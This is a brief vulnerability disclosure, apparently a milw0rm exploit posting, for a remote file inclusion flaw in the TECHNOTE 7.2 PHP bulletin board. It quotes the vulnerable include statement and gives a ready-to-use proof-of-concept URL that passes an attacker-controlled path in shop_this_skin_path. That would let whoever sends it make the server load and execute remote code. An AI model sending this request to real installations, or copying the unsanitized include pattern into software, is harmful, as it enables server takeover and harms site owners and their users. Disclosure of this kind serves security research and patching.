@@ -1,0 +1,28 @@
+TECHNOTE 7.2 (08.09.25) Remote File Inclusion Vulnerability
+bY make0day@gmail.com
+
+/*************************
+
+TECHNOTE (VERSION 7.2 (08.09.25))is bulletin board system of Korea.
+It is freely available for all platforms that supports PHP and MySQL.
+But I find Remote File Inclusion vulnerability.
+Here is the details:
+
+**************************/
+TEST ON VERSION TECHNOTE 7.2 (08.09.25)
+Download : http://www.technote.co.kr/
+/***************************
+Remote File Inclusion Vulnerability
+
+/body_default.php
+
+if($GOODS['gs_input']) include "$shop_this_skin_path/2_view_body/include/form_option.php";
+//File Include
+
+*************************/
+
+poc:
+
+http://[site]/skin_shop/standard/2_view_body/body_default.php?GOODS[no]=deadbeef&GOODS[gs_input]=deadbeef&shop_this_skin_path=[RFI]
+
+# milw0rm.com [2009-02-03]
